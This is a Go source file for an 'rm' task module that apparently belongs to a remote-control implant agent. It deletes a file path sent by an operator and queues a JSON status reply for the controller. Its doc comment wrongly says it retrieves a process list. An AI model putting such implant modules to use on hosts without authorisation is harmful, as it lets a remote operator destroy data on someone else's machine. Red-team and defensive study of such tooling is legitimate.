package rm

import (
	"fmt"
	"os"

	"pkg/utils/structs"
	"sync"
	"pkg/profiles"
	"encoding/json"
)

var mu sync.Mutex

//Run - interface method that retrieves a process list
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	if _, err := os.Stat(task.Params); os.IsNotExist(err) {

		msg.UserOutput = fmt.Sprintf("File '%s' does not exist.", task.Params)
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	err := os.Remove(task.Params)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}
    msg.Completed = true
	msg.UserOutput = fmt.Sprintf("Deleted %s", task.Params)
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
